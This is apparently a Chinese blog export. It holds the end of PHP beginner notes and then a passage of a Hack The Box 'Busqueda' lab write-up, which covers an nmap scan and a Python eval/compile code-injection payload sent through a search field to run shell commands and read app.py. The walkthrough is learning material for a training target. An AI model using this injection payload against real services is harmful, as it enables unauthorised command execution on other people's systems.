<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>则在html中输入的用户名与密码，提交过后，会跳转到php页面进行输出显示。</p>
<h4 id="总结外部变量"><a href="#总结外部变量" class="headerlink" title="总结外部变量"></a>总结外部变量</h4><blockquote>
<p>$_COOKIE 会话控制中的cookie传值信息</p>
<p>$_SESSION 会话控制中的session传值信息</p>
<p>$_FILES 文件撒很难过船的结果</p>
<p>$_GET url上的参数值</p>
<p>$_POST 表单提交的参数值</p>
<p>$_REQUEST 可以得到get或post的传值结果</p>
</blockquote>
<h3 id="3-环境变量"><a href="#3-环境变量" class="headerlink" title="3.环境变量"></a>3.环境变量</h3><p>$_SERVER[“REQUEST_METHOD”] 请求当前php页面的方法</p>
<p>…..</p>
<h2 id="2-常量"><a href="#2-常量" class="headerlink" title="2.常量"></a>2.常量</h2><p><code>define(常量名，值);</code></p>
<blockquote>
<p>说明:</p>
<p>可小写，可不加引号；但通常大写，加引号</p>
<p>字符串中调用常量时，必须在引号外面</p>
</blockquote>
<p>此外，还有内置常量：</p>
<blockquote>
<p>LINE 当前所在行</p>
<p>FILE 当前文件在服务器的路径</p>
<p>FUNCTION 当前函数名</p>
<p>CLASS 当前类名</p>
<p>METHOD 当前成员方法名</p>
<p>PHP_OS PHP运行的操作系统</p>
<p>PHP_VERSION 当前PHP版本</p>
<p>DIR 文件所在目录信息</p>
<p>NAMESPACE 当前命名空间的名称</p>
</blockquote>
<h2 id="3-字界符"><a href="#3-字界符" class="headerlink" title="3.字界符"></a>3.字界符</h2><p>一般英文大写，&gt;&gt;&gt;开始字符+结束字符（相同）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&lt;&lt;&lt;AAA</span></span><br><span class="line"><span class="string">fdhjkdf</span></span><br><span class="line"><span class="string">sdjkf</span></span><br><span class="line"><span class="string">fglkl;sdgjk   dkl</span></span><br><span class="line"><span class="string">sdfgk</span></span><br><span class="line"><span class="string">AAA</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$string</span>;<span class="comment">//字界符声明字符串</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果:fdhjkdf sdjkf fglkl;sdgjk dkl sdfgk</p>
</blockquote>
<h2 id="4-注释"><a href="#4-注释" class="headerlink" title="4.注释"></a>4.注释</h2><p>同c++，单行&#x2F;&#x2F; 多行&#x2F;* *&#x2F;</p>
<h2 id="5-查看和判断变量类型"><a href="#5-查看和判断变量类型" class="headerlink" title="5.查看和判断变量类型"></a>5.查看和判断变量类型</h2><blockquote>
<p>gettype()，获得变量的类型</p>
<p>var_dump()输出变量类型和值</p>
</blockquote>
<p>is_callable()是否为函数</p>
<p>双引号一般是解析变量，单引号效率高一点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_callable</span>(<span class="string">&quot;echo&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;执行真区间&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;执行假区间&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>echo是一个语言结构，不是函数，没有返回值，所以结果为假</p>
<h2 id="6-比较运算符号"><a href="#6-比较运算符号" class="headerlink" title="6.比较运算符号"></a>6.比较运算符号</h2><p>&#x3D;&#x3D;&#x3D; 全等，判断类型、值等于</p>
<p>如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$x=5.1;</span><br><span class="line">$y=5.10;   //全等</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$x=&#x27;5.1&#x27;;</span><br><span class="line">$y=5.10;   //不全等</span><br></pre></td></tr></table></figure>

<p>!&#x3D;&#x3D;不全等，判断类型、值不等于</p>
<h2 id="7-流程控制语句"><a href="#7-流程控制语句" class="headerlink" title="7.流程控制语句"></a>7.流程控制语句</h2><p>if…else</p>
<p>switch</p>
<p>(do) while</p>
<p>for 循环</p>
<p>同c++；</p>
<p>goto 循环语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">goto</span> enen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">enen:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;goto语句触发&#x27;</span>;</span><br><span class="line">    &gt;?</span><br></pre></td></tr></table></figure>

<p>结果为：goto语句触发</p>
<p>可以在for循环里，查找到特定某项时，goto输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">100</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;第&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;次&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span> == <span class="number">15</span>)&#123;</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">end:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;不干了&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果：</p>
<p>第0次</p>
<p>…</p>
<p>第15次</p>
<p>不干了</p>
</blockquote>
<h2 id="8-函数基本语法"><a href="#8-函数基本语法" class="headerlink" title="8.函数基本语法"></a>8.函数基本语法</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">参数名<span class="number">1</span>=[值<span class="number">1</span>], 参数名<span class="number">2</span>=[值<span class="number">2</span>] , 参数名n=[值n]</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    函数中的功能体</span><br><span class="line">    [<span class="keyword">return</span> 返回值]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以可以参照外部变量时的php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line"><span class="variable">$u</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="公用代码处理"><a href="#公用代码处理" class="headerlink" title="公用代码处理"></a>公用代码处理</h3><p>一般会将公用代码放到一个文件中，使用时包含这个文件即可。</p>
<p>包含文件的方法有4种：</p>
<blockquote>
<ol>
<li>include  文件继续向下执行，通常用于动态包含 ；包含失败会返回警告</li>
<li>require 代码不会继续向下执行，通常包含及其重要的文件；失败会返回致命错误</li>
<li>include_once 若该文件曾经包含过，则不再包含；失败时返回警告</li>
<li>require_once  防止文件反复包含；失败时返回致命错误</li>
</ol>
</blockquote>
<h3 id="文件包含举例-include"><a href="#文件包含举例-include" class="headerlink" title="文件包含举例-include"></a>文件包含举例-include</h3><p>如2.php内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is 2.php&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>同级目录中22.php内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;2.php&quot;</span>;</span><br><span class="line"><span class="comment">//2.php的函数直接调用</span></span><br><span class="line"><span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="9-php数组结构"><a href="#9-php数组结构" class="headerlink" title="9.php数组结构"></a>9.php数组结构</h2><p>array(参数可以是任意类型)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$shuzu</span> = <span class="keyword">array</span>(<span class="number">1</span> , <span class="number">1.5</span> , <span class="literal">true</span> ,<span class="string">&#x27;hellophp&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$shuzu</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果:</p>
<p>array(4) { [0]&#x3D;&gt; int(1) [1]&#x3D;&gt; float(1.5) [2]&#x3D;&gt; bool(true) [3]&#x3D;&gt; string(8) “hellophp” }</p>
</blockquote>
<p>索引也可以不从0开始，那就需要自己设置键值对</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="variable">$shuzu</span> = <span class="keyword">array</span>(<span class="number">10</span>=&gt;<span class="number">1</span> , <span class="number">1.5</span> , <span class="number">20</span>=&gt;<span class="literal">true</span> ,<span class="string">&#x27;hellophp&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$shuzu</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [10]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">  [11]=&gt;</span><br><span class="line">  float(1.5)</span><br><span class="line">  [20]=&gt;</span><br><span class="line">  bool(true)</span><br><span class="line">  [21]=&gt;</span><br><span class="line">  string(8) &quot;hellophp&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>访问数组的话， <code>$shuzu[\$i]</code>即可</p>
<p><code>count($shuzu)</code>可以获得所有元素个数</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>array_shift</td>
<td>弹出数组中的第一个元素</td>
</tr>
<tr>
<td>array_unshift</td>
<td>在数组的开始处压入元素</td>
</tr>
<tr>
<td>array_push</td>
<td>向数组的末尾处压入元素</td>
</tr>
<tr>
<td>array_pop</td>
<td>弹出数组末尾的最后一个元素</td>
</tr>
<tr>
<td>current</td>
<td>读出指针当前位置的值</td>
</tr>
<tr>
<td>key</td>
<td>读出指针当前位置的键</td>
</tr>
<tr>
<td>next</td>
<td>指针向下移</td>
</tr>
<tr>
<td>prev</td>
<td>向上移</td>
</tr>
<tr>
<td>reset</td>
<td>指针到开始处</td>
</tr>
<tr>
<td>end</td>
<td>指针到结束处</td>
</tr>
</tbody></table>
<h2 id="10-php正则"><a href="#10-php正则" class="headerlink" title="10.php正则"></a>10.php正则</h2><p>主要用来匹配。</p>
<h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><table>
<thead>
<tr>
<th>字符</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>匹配任意一个字符（除了\n）</td>
</tr>
<tr>
<td>[]</td>
<td>匹配[]中列举的字符</td>
</tr>
<tr>
<td>\d</td>
<td>匹配数字</td>
</tr>
<tr>
<td>\D</td>
<td>非数字</td>
</tr>
<tr>
<td>\s</td>
<td>匹配空白，空格或TAB键</td>
</tr>
<tr>
<td>\S</td>
<td>非空白</td>
</tr>
<tr>
<td>\w</td>
<td>单词字符</td>
</tr>
<tr>
<td>\W</td>
<td>非单词字符</td>
</tr>
</tbody></table>
<h4 id="数量"><a href="#数量" class="headerlink" title="数量"></a>数量</h4><table>
<thead>
<tr>
<th>字符</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>匹配前一个字符出现0次或无数次</td>
</tr>
<tr>
<td>+</td>
<td>匹配前一个字符出现1或无线次</td>
</tr>
<tr>
<td>?</td>
<td>匹配前一个字符出现1次或0次</td>
</tr>
<tr>
<td>{m}</td>
<td>匹配前一个字符出现m次</td>
</tr>
<tr>
<td>{m,}</td>
<td>匹配前一个字符至少出现m次</td>
</tr>
<tr>
<td>{m,n}</td>
<td>匹配前一个字符出现从m到n次</td>
</tr>
</tbody></table>
<h4 id="边界"><a href="#边界" class="headerlink" title="边界"></a>边界</h4><table>
<thead>
<tr>
<th>字符</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>匹配字符串开头</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串结尾</td>
</tr>
<tr>
<td>\b</td>
<td>匹配一个单词的边界</td>
</tr>
<tr>
<td>\B</td>
<td>匹配非单词边界</td>
</tr>
</tbody></table>
<h4 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h4><table>
<thead>
<tr>
<th>字符</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>|</td>
<td>匹配左右任意一个表达式</td>
</tr>
<tr>
<td>(ab)</td>
<td>将括号中字符作为分组</td>
</tr>
<tr>
<td>\num</td>
<td>…</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
</tbody></table>
<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>preg_filter</td>
<td>执行一个正则表达式搜索和替换</td>
</tr>
<tr>
<td>preg_grep</td>
<td>返回匹配模式的数组条目</td>
</tr>
<tr>
<td>preg_match</td>
<td>执行一个正则表达式匹配</td>
</tr>
<tr>
<td>preg_match_all</td>
<td>执行一个全局正则表达式匹配</td>
</tr>
<tr>
<td>preg_replace</td>
<td>执行一个正则表达式搜索和替换</td>
</tr>
<tr>
<td>preg_split</td>
<td>通过一个正则表达式分割字符串</td>
</tr>
</tbody></table>
<h2 id="11-文件操作"><a href="#11-文件操作" class="headerlink" title="11.文件操作"></a>11.文件操作</h2><h3 id="1-读取文件"><a href="#1-读取文件" class="headerlink" title="1.读取文件"></a>1.读取文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readfile ( string: $文件名)</span><br><span class="line">功能：传入一个文件路径，输出一个文件。</span><br><span class="line"></span><br><span class="line">file_get_contents(string: $文件名)打开文件函数</span><br><span class="line"></span><br><span class="line">fopen   (r,r+,w,w+,a,a+)</span><br><span class="line">fread</span><br><span class="line">fclose</span><br></pre></td></tr></table></figure>

<h3 id="2-创建和修改文件内容"><a href="#2-创建和修改文件内容" class="headerlink" title="2.创建和修改文件内容"></a>2.创建和修改文件内容</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents ( string $文件路径, string $写入数据)</span><br><span class="line">功能：向指定的文件当中写入一个字符串，如果文件不存在则创建文件。返回的是写入的字节长度</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$data</span> = <span class="string">&quot;学好PHP&quot;</span>;</span><br><span class="line">   <span class="variable">$numbytes</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$numbytes</span>)&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;写入成功，我们读取看看结果试试：&#x27;</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;test.txt&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;写入失败或者没有权限，注意检查&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>覆盖写：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  <span class="variable">$filename</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line">   <span class="variable">$fp</span>= <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;w&quot;</span>); <span class="comment">//w写，a可以追加写</span></span><br><span class="line">   <span class="variable">$len</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;原文内容会被覆盖&#x27;</span>);</span><br><span class="line">   <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">   <span class="keyword">print</span> <span class="variable">$len</span> .<span class="string">&#x27;字节被写入了\n&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-创建临时文件"><a href="#3-创建临时文件" class="headerlink" title="3.创建临时文件"></a>3.创建临时文件</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  <span class="variable">$handle</span> = <span class="title function_ invoke__">tmpfile</span>();</span><br><span class="line">   <span class="comment">//向里面写入了数据</span></span><br><span class="line">   <span class="variable">$numbytes</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$handle</span>, <span class="string">&#x27;写入临时文件&#x27;</span>);</span><br><span class="line">   <span class="comment">//关闭临时文件，文件即被删除</span></span><br><span class="line">   <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">   <span class="keyword">echo</span>  <span class="string">&#x27;向临时文件中写入了&#x27;</span>.<span class="variable">$numbytes</span> . <span class="string">&#x27;个字节&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-移动、拷贝、删除文件"><a href="#4-移动、拷贝、删除文件" class="headerlink" title="4.移动、拷贝、删除文件"></a>4.移动、拷贝、删除文件</h3><blockquote>
<p>重命名：rename($old,$new)</p>
<p>复制：copy($old,$new)</p>
<p>删除：unlink()</p>
<p>文件属性函数：file_exists…</p>
<p>目录处理函数：opendir&#x2F;closedir&#x2F;filetype</p>
<p>文件权限设置：chmod(文件名，777)</p>
<p>文件路径函数：pathinfo(返回文件的各个组成部分)&#x2F;basename(文件名)…</p>
</blockquote>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>开发语言</tag>
      </tags>
  </entry>
  <entry>
    <title>hack the box</title>
    <url>/2023/05/31/hack-the-box/</url>
    <content><![CDATA[<p>下载htb的openvpn文件后，openvpn 文件</p>
<h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><h2 id="1-Busqueda-linux提权"><a href="#1-Busqueda-linux提权" class="headerlink" title="1.Busqueda(linux提权)"></a>1.Busqueda(linux提权)</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/m0_56308852/article/details/130168742?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-5-130168742-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">htb busqueda wp要点记录_春猿火的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_58869808/article/details/130050438?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-130050438-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">(87条消息) HTB Busqueda WriteUP_Som3B0dy的博客-CSDN博客</a></p>
<p><a href="https://www.bilibili.com/video/BV1LV4y1Z7Wp/?spm_id_from=333.337.search-card.all.click">Hack The Box 赛季活动靶场【Busqueda】User &amp; System Flag攻略_哔哩哔哩_bilibili</a></p>
<p><a href="https://blog.csdn.net/qq_37370714/article/details/130619426?ops_request_misc=&request_id=&biz_id=102&utm_term=Busqueda&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-130619426.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">(87条消息) HTB-Busqueda_永远是深夜有多好。的博客-CSDN博客</a></p>
<p>ping一遍，能ping通</p>
<p>发现端口：&#96;nmap -A  10.10.11.208 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)</span><br><span class="line">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: Did not follow redirect to http://searcher.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>

<p>22端口开放，一般最后考虑，如果爆破不出来就放弃。</p>
<p>火狐直接访问，访问不了</p>
<p><code>echo &quot;10.10.11.208 searcher.htb &quot; &gt;&gt; /etc/hosts</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192607683.png"></p>
<p>选了个google，查找内容为123</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192819640.png"></p>
<p>很明显，post。</p>
<p>抓包试试，加个单引号不显示内容</p>
<p>sqlmap一下，没有注入点。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604194935260.png"></p>
<p>点击后，发现如下东西：</p>
<blockquote>
<p>Custom Engine</p>
<p>from searchor import Engine<br>Engine.new(“Colgate”, “<a href="https://www.colgate.com/en-us/search/all?term=">https://www.colgate.com/en-us/search/all?term=</a>“)<br>Engine.Colgate.search(“Hi world!”)<br>‘<a href="https://www.colgate.com/en-us/search/all?term=Hi%20world">https://www.colgate.com/en-us/search/all?term=Hi%20world</a>!”</p>
<p>Searchor CLI Quick Start</p>
<p>$ searchor Google “Hello World!” –copy</p>
</blockquote>
<p>这是调用引擎库去获取数据吧。</p>
<p><code>Engine.Colgate.search(&quot;Hi world!&quot;)</code></p>
<p>wp上说尝试构造<code>eval(complie(“要执行的代码”),“&lt;String&gt;”,“exec”)</code></p>
<blockquote>
<p>compile() 是一个 Python 内置函数，用于编译字符串、文件或 AST（Abstract Syntax Trees）对象成为字节码或 AST 对象。它的语法为：</p>
<p>compile(source, filename, mode, flags&#x3D;0, dont_inherit&#x3D;False, optimize&#x3D;-1)<br>source: 必选项，表示要编译的源代码，可以是字符串、文件或 AST 对象。<br>filename: 可选项，表示编译代码的文件名，如果不是从文件中编译代码，传入 “<string>” 即可。<br>mode: 可选项，表示编译代码类型，可以取值为 “exec”（编译整个代码），“eval”（编译单个表达式）或 “single”（编译单个语句）。<br>flags: 可选项，传入变量或位掩码，用于控制编译器的行为或特性。<br>dont_inherit: 可选项，表示是否继承 sys.flags 和 sys. __ optimizations __ 模块中相关选项的值。<br>optimize: 可选项，表示优化级别，如果设置为 -1，表示使用默认优化级别。<br>compile() 函数编译完成后，将会返回一个 code 对象，这个对象可以传递给 exec() 函数执行，也可以将其作为模块使用。compile() 函数在 Python 中比较常用，常用于动态编译、语法检查和代码执行等场景中。</p>
</blockquote>
<p>在bp上这样构造：</p>
<blockquote>
<p>query&#x3D;123’<strong>%2b</strong>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))<strong>%2b’</strong></p>
</blockquote>
<p>+、%20我都试过，不行，为啥非要2b,2f也可以，不懂</p>
<p>效果是这样的，</p>
<blockquote>
<p>searchor Google <strong>‘</strong>123’%2beval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))%2b’<strong>’</strong>–copy</p>
</blockquote>
<p>相当于执行了参数为:</p>
<p><strong>‘</strong>123’ </p>
<p>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))</p>
<p>和&#39;‘</p>
<p>repeat结果里是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;app.py%0Atemplates&quot;&gt;app.py</span><br><span class="line">templates&lt;/a&gt;. If not, click the link.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那其实ls可以改为 cat app.py，出现一串代码</p>
<p>shift+ctrl+u后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, render_template, request, redirect</span><br><span class="line">from searchor import Engine</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/&amp;#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&amp;#x27;&amp;#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/search&amp;#x27;, methods=[&amp;#x27;POST&amp;#x27;])</span><br><span class="line">def search():</span><br><span class="line">    try:</span><br><span class="line">        engine = request.form.get(&amp;#x27;engine&amp;#x27;)</span><br><span class="line">        query = request.form.get(&amp;#x27;query&amp;#x27;)</span><br><span class="line">        auto_redirect = request.form.get(&amp;#x27;auto_redirect&amp;#x27;)</span><br><span class="line">        </span><br><span class="line">        if engine in Engine.__members__.keys():</span><br><span class="line">            arg_list = [&amp;#x27;searchor&amp;#x27;, &amp;#x27;search&amp;#x27;, engine, query]</span><br><span class="line">            r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">            url = r.stdout.strip().decode()</span><br><span class="line">            if auto_redirect is not None:</span><br><span class="line">                return redirect(url, code=302)</span><br><span class="line">            else:</span><br><span class="line">                return url</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Invalid engine!&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Something went wrong!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &amp;#x27;__main__&amp;#x27;:</span><br><span class="line">    app.run(debug=False)</span><br></pre></td></tr></table></figure>

